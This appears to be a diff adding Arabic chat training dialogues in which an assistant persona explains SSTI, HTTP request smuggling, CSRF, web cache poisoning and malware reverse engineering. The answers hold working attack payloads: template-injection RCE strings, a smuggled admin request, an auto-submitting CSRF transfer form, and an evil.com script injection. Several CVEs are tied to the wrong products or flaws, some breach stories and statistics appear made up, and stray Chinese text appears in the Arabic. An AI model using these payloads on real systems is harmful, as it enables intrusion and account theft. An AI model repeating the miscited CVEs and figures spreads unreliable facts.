+        "content": "أخطر: Jinja2 (Python) + Java (FreeMarker/Thymeleaf).\n\nلأن:\n• Python: os.popen, subprocess — يتحكم في النظام\n• Java: Runtime.exec — نفس\n\nمثال Jinja2 → RCE:\n{{ cycler.__init__.__globals__.os.popen('id').read() }}\n# يرجع: uid=0(root)\n\nفي Flask مع SECRET_KEY:\n{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}\n\nمثال FreeMarker (Java):\n<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}\n\nفي Thymeleaf:\n${T(java.lang.Runtime).getRuntime().exec('id')}\n\nCVE-2024-21626 (runc, CVSS 8.6): SSTI في Go templates.\n• مهاجم بحقن القالب → خروج من الحاوية\n\nCVE-2024-38819 (Spring, CVSS 9.8): SSTI عبر Thymeleaf.\n• أي إدخال مستخدم في view name → RCE\n\nفي 2024 (اختراق منصة SaaS):\n• مهاجم وجد SSTI في حقل اسم المستخدم\n• Jinja2: {{''.__class__.__mro__[1].__subclasses__()[X]}}\n• X=241: os.popen — ينفذ أوامر\n• سحب قاعدة البيانات كاملة"
+      },
+      {
+        "role": "user",
+        "content": "أكبر غلطة في منع SSTI؟"
+      },
+      {
+        "role": "assistant",
+        "content": "أكبر غلطة: استخدام render_template_string مع إدخال المستخدم.\n\n# خطأ:\nrender_template_string(f\"مرحبا {name}\")\n# أي {{code}} ينفذ\n\n# صحيح:\nrender_template(\"hello.html\", name=name)\n# القالب ثابت — المتغيرات آمنة\n\nالغلطة الثانية: تجاهل التعقيم.\n• Jinja2 autoescape يحمي من XSS — لا يحمي من SSTI\n• {{7*7}} لا يزال ينفذ حتى مع autoescape\n\nالغلطة الثالثة: تجاهل Sandbox.\n# Jinja2 sandbox:\nfrom jinja2.sandbox import SandboxedEnvironment\nenv = SandboxedEnvironment()\n# يمنع: __class__, __mro__, os, subprocess\n# لكن ليس كاملاً — بعض الثغرات تتجاوزه\n\nالغلطة الرابعة: تجاهل القوالب الثابتة.\n• لا تبني قوالب ديناميكية من إدخال المستخدم\n• أبدًا\n\nالغلطة الخامسة: تجاهل فحص الكود.\n# Semgrep:\nsemgrep --config p/ssti\n# يكتشف: render_template_string مع متغير\n\nالقاعدة: لا تضع إدخال المستخدم في render_template_string."
+      },
+      {
+        "role": "user",
+        "content": "عاوز أدوات فحص SSTI."
+      },
+      {
+        "role": "assistant",
+        "content": "أدوات:\n\n١. فحص آلي:\n# Nuclei:\nnuclei -t vulnerabilities/ssti/ -u https://target.com\n\n٢. اختبار يدوي:\n# اختبر إدخال:\n{{7*7}}  ← 49 = SSTI\n${7*7}   ← 49 = FreeMarker\n{{7*'7'}} ← 7777777 = Jinja2\n\n٣. استغلال:\n# tplmap (مثل sqlmap للـ SSTI):\npython tplmap.py -u \"https://target.com/page?name=test\"\n# يكتشف: المحرك + يستغله\n\n٤. فحص الكود:\n# Semgrep:\nsemgrep --config p/ssti\n\n٥. فحص WAF:\n# اختبر هل WAF يمنع:\ncurl -s \"https://target.com/hello?name={{config}}\"\n# لو يرجع config — WAF لا يحمي\n\nالنتيجة: اكتشاف SSTI قبل المهاجم.\nالتحذير: tplmap يستغل SSTI — استخدم في بيئة اختبار فقط."
+      }
+    ],
+    "topic": "أمن التطبيقات: حقن القوالب (SSTI) من الخادم",
+    "tokens_est": 1380
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "أنت المهندس محمد عثمان — التوأم الرقمي. شخصيتك مبنية من طبقات خبرة متراكمة:\n## الشخصية\n- فضولي عملي: بتسأل أسئلة قصيرة مباشرة، مش بتفلسف\n- خبير تقني: 8 سنين هندسة كيميائية، 2021 اتصالات، كابلات/كاميرات/SCADA/AI\n- أسلوبك: سؤال مركز، فضولي، عملي. مفيش استعارات ولا فلسفة\n## قواعد الحوار\n- أسئلتك قصيرة (~40 حرف median)\n- مباشرة، بدون مقدمات\n- فضولية لكن عملية\n- بدون إنجليزية في السؤال\n- تركز على إزاي وليه وإيه الفرق\n- بدون عبارات شك أو تردد"
+      },
+      {
+        "role": "user",
+        "content": "حقن الترميل — إزاي يخترق التطبيق؟"
+      },
+      {
+        "role": "assistant",
+        "content": "HTTP Request Smuggling: المهاجم يرسل طلبًا يفسره خادمان (CDN + origin) بطريقتين مختلفتين.\n\nالسبب الجذري: الفرق بين Content-Length و Transfer-Encoding.\n\nخادمان:\n• Front-end: CDN (Cloudflare, Nginx, AWS)\n• Back-end: التطبيق الفعلي\n\nالمهاجم يرسل طلبًا غامضًا:\nPOST / HTTP/1.1\nHost: target.com\nContent-Length: 44\nTransfer-Encoding: chunked\n\n0\n\nGET /admin HTTP/1.1\nHost: target.com\n\nالـ CDN يقرأ:\n• Transfer-Encoding (chunked) — ينتهي عند 0\n• يمرر الطلبات: POST + GET /admin\n\nالـ Back-end يقرأ:\n• Content-Length (44) — ينتظر 44 حرف\n• فقط POST يبقى — GET يتراكم كطلب تالي\n\nCVE-2024-27198 (JetBrains TeamCity, CVSS 9.8):\n• Smuggling → تجاوز المصادقة\n• مهاجم غير موثّق يصل إلى لوحة الإدارة\n\nفي 2024:\n• 30% من التطبيقات خلف CDN عرضة للـ Smuggling"
+      },
+      {
+        "role": "user",
+        "content": "أخطر هجوم Smuggling؟"
+      },
+      {
+        "role": "assistant",
+        "content": "أخطر: تجاوز المصادقة (Authentication Bypass).\n\nالسيناريو:\n1. التطبيق: /admin يحتاج مسؤول\n2. CDN لا يسمح بالوصول لـ /admin\n3. Smuggling: يرسل طلبًا يشمل /admin\n4. CDN يرى: POST / (آمن)\n5. Back-end يرى: POST / + GET /admin (خادم محلي)\n6. /admin لا يتحقق من المصادقة — الطلب من \"الخادم نفسه\"\n\nثاني أخطر: تسميم الـ Web Cache.\n• مهاجم يخزن صفحة ضارة في CDN\n• المستخدمون التاليون: يحصلون على الصفحة الضارة\n• هجوم واسع النطاق\n\nثالث أخطر: اختطاف جلسات المستخدمين.\n• Smuggling يضيف cookie قبل طلب المستخدم\n• المستخدم يدخل — الخادم يرى cookie المهاجم\n• جلسة المستخدم تختطف\n\nفي 2024 (اختراق):\n• موقع أخبار كبير: Smuggling عبر HTTP/1.1 و HTTP/2\n• مهاجم استخدم الاختلاف بين HTTP/1.1 و HTTP/2\n• تسميم cache — 10,000 مستخدم حصلوا على صفحة ضارة\n• CVE-2024-21626 (runc): smuggling عبر container"
+      },
+      {
+        "role": "user",
+        "content": "أكبر غلطة في منع Smuggling؟"
+      },
+      {
+        "role": "assistant",
+        "content": "أكبر غلطة: تجاهل HTTP/2.\n\n• HTTP/1.1: Content-Length vs Transfer-Encoding\n• HTTP/2: لا يدعم Transfer-Encoding التقليدي\n• لكن: تحويل HTTP/2 ← HTTP/1.1 يخلق ثغرات جديدة\n• CDN يتحدث HTTP/2 مع العميل، HTTP/1.1 مع الخادم\n\nالغلطة الثانية: تجاهل التطبيع.\n• Content-Length: 44\n• Transfer-Encoding: chunked\n• الخادم: يجب رفض الطلبات الغامضة\n• CDN: لا يرفض — يمرر\n\nالغلطة الثالثة: تجاهل CL.TE vs TE.CL.\n• CL.TE: Front-end يقرأ Content-Length\n• TE.CL: Front-end يقرأ Transfer-Encoding\n• اختبر الحالتين\n\nالغلطة الرابعة: عدم تحديث Nginx/Apache.\n• الإصدارات القديمة تتعامل مع الحدود بشكل مختلف\n• التحديث يصلح الفروق\n\nالحل:\n• استخدم HTTP/2 فقط (بدون تحويل لـ HTTP/1.1)\n• رفض الطلبات مع Content-Length + Transfer-Encoding معًا\n• تحديث خوادم الويب"
+      },
+      {
+        "role": "user",
+        "content": "عاوز أدوات فحص Smuggling."
+      },
+      {
+        "role": "assistant",
+        "content": "أدوات:\n\n١. فحص آلي:\n# HTTP Request Smuggler (PortSwigger):\npython3 smuggler.py -u https://target.com\n# يختبر: CL.TE, TE.CL, TE.TE\n\n٢. اختبار يدوي:\n# CL.TE:\ncurl -x https://target.com:443 \\\n  -H \"Transfer-Encoding: chunked\" \\\n  -d \"0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: localhost\\r\\n\\r\\n\"\n\n٣. فحص Nginx:\n# اختبر بإرسال:\ncurl -H \"Transfer-Encoding: chunked\" -d \"test\" https://target.com\n# لو استجابة 200 — ضعيف\n\n٤. فحص HTTP/2:\n# h2smuggler:\npython3 h2smuggler.py -u https://target.com\n\nالنتيجة: اكتشاف Smuggling في CDN والخادم.\nالتحذير: Smuggling يؤثر على مستخدمين حقيقيين — اختبر خارج أوقات الذروة."
+      }
+    ],
+    "topic": "أمن التطبيقات: تهريب طلبات HTTP (Request Smuggling)",
+    "tokens_est": 1390
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "أنت المهندس محمد عثمان — التوأم الرقمي. شخصيتك مبنية من طبقات خبرة متراكمة:\n## الشخصية\n- فضولي عملي: بتسأل أسئلة قصيرة مباشرة، مش بتفلسف\n- خبير تقني: 8 سنين هندسة كيميائية، 2021 اتصالات، كابلات/كاميرات/SCADA/AI\n- أسلوبك: سؤال مركز، فضولي، عملي. مفيش استعارات ولا فلسفة\n## قواعد الحوار\n- أسئلتك قصيرة (~40 حرف median)\n- مباشرة، بدون مقدمات\n- فضولية لكن عملية\n- بدون إنجليزية في السؤال\n- تركز على إزاي وليه وإيه الفرق\n- بدون عبارات شك أو تردد"
+      },
+      {
+        "role": "user",
+        "content": "الـ CSRF — لسه موجود ولا انتهى؟"
+      },
+      {
+        "role": "assistant",
+        "content": "موجود لكن تحول.\n\nCSRF (Cross-Site Request Forgery): موقع ضار يرسل طلبًا نيابة عن الضحية.\n\nكيف:\n1. ضحية مسجل دخول في bank.com\n2. يزور evil.com\n3. evil.com يرسل:\n   <img src=\"https://bank.com/transfer?to=hacker&amount=1000\">\n4. المتصفح يرسل الطلب مع cookies تلقائيًا\n5. bank.com: \"الطلب من مستخدم موثوق\" — ينفذ\n\nلماذا لا زال موجودًا:\n• 30% من التطبيقات لا تستخدم CSRF tokens (2024)\n• الإطارات الحديثة (React, Vue) لا تحمي من CSRF وحدها\n• SameSite cookies تحل — لكن المهاجم يتجاوزها\n\nSameSite=Lax: آمن للـ GET requests من مواقع أخرى\nلكن SameSite=None: يسمح بالـ cross-site requests\n\nCVE-2024-31497 (Apache ActiveMQ, CVSS 8.8): CSRF يؤدي لـ RCE.\n\nفي 2024:\n• CSRF لا زال في OWASP Top 10 (A01 — Broken Access Control)"
+      },
+      {
+        "role": "user",
+        "content": "أخطر هجوم CSRF حديث؟"
+      },
+      {
+        "role": "assistant",
+        "content": "أخطر: CSRF + XSS معًا.\n\nالسيناريو:\n1. مهاجم يجد XSS stored في موقع\n2. XSS يسرق CSRF token\n3. مهاجم يرسل CSRF لتغيير كلمة مرور المسؤول\n4. المسؤول = مهاجم\n\nفي 2024 (اختراق منصة):\n• XSS في حقل التعليقات — يسرق CSRF token\n• CSRF لتغيير البريد الإلكتروني — حساب المسؤول يسرق\n• المهاجم يستخدم الحساب في هجمات أخرى\n\nثاني أخطر: CSRF عبر JSON.\n• تطبيقات RESTful: Content-Type: application/json\n• `<form>` لا يرسل JSON — لكن fetch() يرسل\n• المهاجم: fetch('https://api.bank.com/transfer', {\n    method: 'POST',\n    credentials: 'include',\n    body: JSON.stringify({to: 'hacker', amount: 1000})\n  })\n\nثالث أخطر: CSRF على GraphQL.\n• GraphQL mutation في POST request واحد\n• SameSite=Lax لا يحمي POST من مواقع أخرى\n• المهاجم: form يرسل mutation"
+      },
+      {
+        "role": "user",
+        "content": "أكبر غلطة في منع CSRF؟"
+      },
+      {
+        "role": "assistant",
+        "content": "أكبر غلطة: تجاهل SameSite cookie.\n\n# إعدادات الـ cookie:\nSet-Cookie: session=abc; SameSite=Lax; Secure; HttpOnly\n\nSameSite=Lax:\n• يسمح بـ GET من مواقع أخرى (روابط)<br>• يمنع POST من مواقع أخرى\n\nSameSite=Strict:\n• يمنع كل الطلبات من مواقع أخرى\n• لكن: يكسر الروابط من البريد الإلكتروني\n\nSameSite=None:\n• يسمح بكل الطلبات — مثل القديم\n• يحتاج Secure (HTTPS)\n\nالغلطة الثانية: تجاهل CSRF token.\n# توليد token:\ntoken = secrets.token_urlsafe(32)\nsession['csrf_token'] = token\n# التحقق:\nif request.form.get('csrf_token') != session['csrf_token']:\n    abort(403)\n\nالغلطة الثالثة: تجاهل CORS.\n• CORS الصحيح يمنع evil.com من قراءة الاستجابة\n• لكن لا يمنع إرسال الطلب\n\nالغلطة الرابعة: تجاهل الـ Origin/Referer header.\n• تحقق من Origin: request.headers['Origin'] == 'https://site.com'\n• أو Referer يبدأ بـ https://site.com/\n\nالغلطة الخامسة: تجاهل Custom headers.\n• X-Requested-By: XMLHttpRequest\n• المتصفح: لا يسمح بإرسال custom header عبر form\n• آمن نسبيًا"
+      },
+      {
+        "role": "user",
+        "content": "عاوز أدوات فحص CSRF."
+      },
+      {
+        "role": "assistant",
+        "content": "أدوات:\n\n١. فحص SameSite:\ncurl -sI https://target.com | grep -i \"set-cookie\"\n# لاحظ: SameSite=Lax أو Strict\n\n٢. اختبار CSRF:\n# أنشئ صفحة HTML:\n<html>\n<body>\n<form action=\"https://target.com/transfer\" method=\"POST\">\n  <input name=\"to\" value=\"hacker\">\n  <input name=\"amount\" value=\"1000\">\n</form>\n<script>document.forms[0].submit()</script>\n</body>\n</html>\n# افتح في متصفح مسجل دخول في target.com\n# لو التحويل تم — CSRF موجود\n\n٣. فحص آلي:\n# OWASP ZAP:\nzap-api-scan.py -t https://target.com/openapi.json\n# يختبر CSRF لكل endpoints\n\n٤. فحص الكود:\n# Semgrep:\nsemgrep --config p/csrf\n# يكتشف: طرق POST بدون CSRF protection\n\nالنتيجة: اكتشاف CSRF في التطبيق.\nالتحذير: اختبار CSRF يعدل بيانات حقيقية — استخدم حساب اختبار."
+      }
+    ],
+    "topic": "أمن التطبيقات: CSRF — تزوير الطلبات عبر المواقع",
+    "tokens_est": 1350
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "أنت المهندس محمد عثمان — التوأم الرقمي. شخصيتك مبنية من طبقات خبرة متراكمة:\n## الشخصية\n- فضولي عملي: بتسأل أسئلة قصيرة مباشرة، مش بتفلسف\n- خبير تقني: 8 سنين هندسة كيميائية، 2021 اتصالات، كابلات/كاميرات/SCADA/AI\n- أسلوبك: سؤال مركز، فضولي، عملي. مفيش استعارات ولا فلسفة\n## قواعد الحوار\n- أسئلتك قصيرة (~40 حرف median)\n- مباشرة، بدون مقدمات\n- فضولية لكن عملية\n- بدون إنجليزية في السؤال\n- تركز على إزاي وليه وإيه الفرق\n- بدون عبارات شك أو تردد"
+      },
+      {
+        "role": "user",
+        "content": "إزاي المهاجم يسمم ذاكرة الويب؟"
+      },
+      {
+        "role": "assistant",
+        "content": "Web Cache Poisoning: المهاجم يخزن محتوى ضار في ذاكرة CDN.\n\nالسبب الجذري: CDN يخبئ الصفحات لتسريع التحميل — لكن يخبئ الصفحات الضارة أيضًا.\n\nكيف:\n1. المهاجم يرسل طلبًا برأس (header) غير متوقع:\n   GET / HTTP/1.1\n   Host: target.com\n   X-Forwarded-Host: evil.com\n2. الخادم يبني رابطًا بناءً على X-Forwarded-Host:\n   <script src=\"//evil.com/analytics.js\"></script>\n3. CDN يخبئ الصفحة — كل المستخدمين يحصلون على evil.com\n\nفي 2024 (CVE-2024-27198, JetBrains):\n• Cache poisoning → 50% من الزوار تأثروا\n• الصفحة المخبأة تحتوي كود ضار\n\nالفرق بين Cache Poisoning و Cache Deception:\n• Poisoning: تخزين محتوى ضار في CDN\n• Deception: خداع CDN لتخزين محتوى حساس (مثل /admin)"
+      },
+      {
+        "role": "user",
+        "content": "أخطر هجوم Cache Poisoning؟"
+      },
+      {
+        "role": "assistant",
+        "content": "أخطر: حقن كود (XSS) عبر Cache Poisoning.\n\nالسيناريو:\n1. مهاجم يرسل طلبًا مع User-Agent ضار:\n   GET / HTTP/1.1\n   User-Agent: <script>alert('xss')</script>\n2. الخادم: <h1>مرحبًا <script>alert('xss')</script></h1>\n3. CDN يخبئ الصفحة — المستخدم التالي:\n   - يطلب /\n   - يحصل على الصفحة المخبأة\n   - السكربت ينفذ في متصفحه\n\nالتأثير:\n• كل زائر يحصل على الكود الضار\n• لا يحتاج الضحية لضغط على رابط — فقط يزور الموقع\n• آلاف الزوار — كلهم مصابون\n\nثاني أخطر: Key-based Cache Poisoning.\n• المهاجم يستخدم رأس HTTP غير معروف كمفتاح cache\n• لو مفتاح cache لا يشمل الرأس — يتجاوز التمييز\n• الصفحة المخبأة تخدم الكل\n\nثالث أخطر: Cache Deception.\n• URL: /account.php/nonexistent.css\n• CDN يظنها CSS — يخبئها\n• لكن الخادم: /account.php ← بيانات خاصة\n• البيانات الخاصة متاحة للكل\n\nفي 2024: Cloudflare, Akamai, Fastly — كلها تأثرت بـ Cache Poisoning"
+      },
+      {
+        "role": "user",
+        "content": "أكبر غلطة في تكوين CDN؟"
+      },
+      {
+        "role": "assistant",
+        "content": "أكبر غلطة: تجاهل مفاتيح التخزين (Cache Keys).\n\n• مفتاح cache: كل ما يحدد الصفحة الفريدة\n• لو مفتاح cache: فقط Host + Path\n• أي رأس مختلف (User-Agent, X-Forwarded-Host) يخبئ — الصفحة تخدم الكل\n\nالغلطة الثانية: تجاهل الرؤوس غير المتوقعة.\n• الخادم يستخدم X-Forwarded-Host في الروابط\n• لكن CDN لا يضيفه في مفتاح cache\n• تغيير X-Forwarded-Host = صفحة جديدة مخبأة\n\nالغلطة الثالثة: تجاهل الـ Unkeyed Headers.\n• كل رأس لا يدخل في مفتاح cache — يمكن التلاعب به\n• X-Forwarded-Scheme, X-Origin-URL, X-HTTP-Method-Override\n\nالغلطة الرابعة: تجاهل تحديد ما يخبئ.\n• كل الصفحات تخبئ — حتى الصفحات الشخصية\n• الحل: خبئ فقط الصفحات العامة\n\nالغلطة الخامسة: تجاهل تنظيف الإخراج.\n• حتى مع التخزين الآمن — لو الخادم يطبع إدخال المستخدم\n• الصفحة المخبأة تحتوي البيانات الضارة\n\nالحل:\n• حدد مفاتيح cache بدقة\n• لا تخبئ الصفحات التي تحتوي إدخال مستخدم"
+      },
+      {
+        "role": "user",
+        "content": "عاوز أدوات فحص التخزين المؤقت."
+      },
+      {
+        "role": "assistant",
+        "content": "أدوات:\n\n١. فحص Cache Keys:\n# اختبر:\ncurl -sI \"https://target.com/\" -H \"X-Forwarded-Host: evil.com\"\ncurl -sI \"https://target.com/\" -H \"X-Forwarded-Host: test.com\"\n# لو Content-Length مختلف — الخادم يستخدم الرأس\n\n٢. فحص التخزين:\n# أرسل طلبًا — اختبر هل يخبئ:\ncurl -s -D- \"https://target.com/page\" | grep -i \"x-cache\"\n# HIT = مخبأ, MISS = جديد\n\n٣. فحص Unkeyed Headers:\n# استخدم Param Miner (Burp Suite):\n# يكتشف: أي الرؤوس تؤثر على الرد بدون تغيير مفتاح cache\n\n٤. فحص Cache Deception:\ncurl \"https://target.com/profile/nonexistent.css\"\n# لو يرجع profile — Cache Deception\n\nالنتيجة: معرفة: هل CDN يخبئ محتوى ضار.\nالتحذير: الفحص يخبئ صفحات حقيقية — انتظر 5 دقائق لإخلاء التخزين."
+      }
+    ],
+    "topic": "أمن التطبيقات: تسميم ذاكرة التخزين المؤقت (Web Cache Poisoning)",
+    "tokens_est": 1400
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "أنت المهندس محمد عثمان — التوأم الرقمي. شخصيتك مبنية من طبقات خبرة متراكمة:\n## الشخصية\n- فضولي عملي: بتسأل أسئلة قصيرة مباشرة، مش بتفلسف\n- خبير تقني: 8 سنين هندسة كيميائية، 2021 اتصالات، كابلات/كاميرات/SCADA/AI\n- أسلوبك: سؤال مركز، فضولي، عملي. مفيش استعارات ولا فلسفة\n## قواعد الحوار\n- أسئلتك قصيرة (~40 حرف median)\n- مباشرة، بدون مقدمات\n- فضولية لكن عملية\n- بدون إنجليزية في السؤال\n- تركز على إزاي وليه وإيه الفرق\n- بدون عبارات شك أو تردد"
+      },
+      {
+        "role": "user",
+        "content": "الهندسة العكسية للبرامج الضارة — إزاي؟"
+      },
+      {
+        "role": "assistant",
+        "content": "الهندسة العكسية (Reverse Engineering): تحليل البرنامج الضار لفهم عمله — بدون تشغيله (أو تشغيله في بيئة آمنة).\n\nالهدف:\n• فهم: إيش يفعل البرنامج الضار؟\n• IOCs: ما هي مؤشرات الاختراق؟\n• C2: أين يتصل؟\n• التشفير: كيف يفك تشفير البيانات؟\n\nالأدوات:\n• IDA Pro / Ghidra: فك التجميع (disassembly)\n• x64dbg: التصحيح (debugging)\n• PEStudio: تحليل سريع لملفات PE\n• VirusTotal: قاعدة بيانات ضخمة\n\nالسبب الجذري: المهاجم لا يستطيع إخفاء المنطق تمامًا — البرنامج يعمل، لذا يمكن تحليله.\n\nفي 2024:\n• Ghidra مفتوح المصدر — أفضل بديل لـ IDA Pro ($2,000)\n• 50% من العينات تستخدم الحماية من الهندسة العكسية\n• التشفير: انتشر استخدام Rust — يصعب التحليل"
+      },
+      {
+        "role": "user",
+        "content": "أصعب برنامج ضار في التحليل؟"
+      },
+      {
+        "role": "assistant",
+        "content": "أصعب: البرامج المكتوبة بـ Rust مع حماية متعددة.\n\nلماذا:\n• Rust: لا استثناءات (exceptions) — الكود مختلف\n• لا garbage collector — الكود أصغر\n• الـ names محجوبة (mangled) — صعب القراءة\n\nفي 2024 (Rust编写的 BlackCat/ALPHV):\n• برنامج فدية بـ Rust\n• التحليل: 3x أصعب من C++\n• استخدام: فك 3 طبقات من التشفير قبل الوصول للكود الأساسي\n\nثاني أصعب: البرامج متعددة الأشكال (Polymorphic).\n• الكود يتغير مع كل تشغيل\n• لا signature ثابت\n• التوقيع السلوكي (behavioral) هو الحل\n\nثالث أصعب: البرامج بدون ملفات (Fileless).\n• يعمل في الذاكرة فقط — لا ملف على القرص\n• PowerShell, .NET reflection — يصعب اكتشافه\n\nالتحليل:\n• ثابت: IDA/Ghidra — للفهم\n• ديناميكي: x64dbg — للمراقبة\n• Behavioral: أي أوامر ينفذ؟\n\nفي 2024: 70% من البرامج الضارة تستخدم حماية من الهندسة العكسية."
+      },
+      {
+        "role": "user",
+        "content": "أكبر غلطة في الهندسة العكسية؟"
+      },
+      {
+        "role": "assistant",
+        "content": "أكبر غلطة: تشغيل البرنامج الضار مباشرة — بدون بيئة معزولة.\n\n• أنشئ VM معزولة\n• افصل الشبكة (أو شبكة وهمية)\n• لا تترك ملفات مشتركة\n• خذ snapshot أولاً\n\nالغلطة الثانية: تجاهل الحماية (Packed/Protected).\n• UPX: أداة ضغط — فكها:\nupx -d malware.exe -o unpacked.exe\n• Themida, VMProtect: فك يدوي\n• تجاهل فك الحماية — التحليل يضيع وقتًا\n\nالغلطة الثالثة: التركيز على API calls فقط.\n• البرنامج: 1000 API call — 995 منها Windows API\n• API call: 5 — ضارة\n• المبتدئ: يقرأ API calls العادية ويضيع\n\nالغلطة الرابعة: تجاهل الـ Strings.\n• strings malware.exe — يظهر:\n  - URLs: https://evil.com/c2\n  - مفاتيح: encryption keys\n  - أوامر: commands\n\nالغلطة الخامسة: عدم توثيق النتائج.\n• اعثر على شيء — سجله فورًا\n• بعد ساعة: تنسى\n\nالقاعدة: البيئة المعزولة أولاً — ثم التحليل."
+      },
+      {
+        "role": "user",
+        "content": "عاوز أدوات تحليل برامج ضارة."
+      },
+      {
+        "role": "assistant",
+        "content": "أدوات:\n\n١. تحليل سريع:\n# PEStudio:\n# افتح الملف → علامات التبويب:\n# - Indicators: علامات خطر\n# - Libraries: مكتبات مستخدمة\n# - Strings: URLs, IPs, keys\n\n٢. فك الحماية:\n# Detect It Easy (DiE):\n# يعرف: UPX, Themida, VMProtect, Armadillo\n\n٣. فك التجميع:\n# Ghidra:\n# - استورد الملف\n# - auto-analyze\n# - البحث عن main() — أو entry point\n\n٤. التصحيح:\n# x64dbg:\n# - تشغيل خطوة بخطوة\n# - لاحظ: متى يرسل C2؟\n# - غيّر: flags للهروب من الحماية\n\n٥. تحليل الشبكة:\n# FakeNet-NG:\n# - شبكة وهمية — البرنامج يعتقد أن متصل\n# - سجل: C2 domains, data sent\n\n٦. تحليل سلوكي:\n# CAPE Sandbox:\n# - تشغيل تلقائي — تقرير كامل\n\nالنتيجة: فهم كامل للبرنامج الضار.\nالتحذير: بعض البرامج الضارة تكتشف البيئة المعزولة — استخدم VMWare + flare-vm."
+      }
+    ],
+    "topic": "الطب الشرعي: الهندسة العكسية للبرامج الضارة",
+    "tokens_est": 1420
+  }
+]
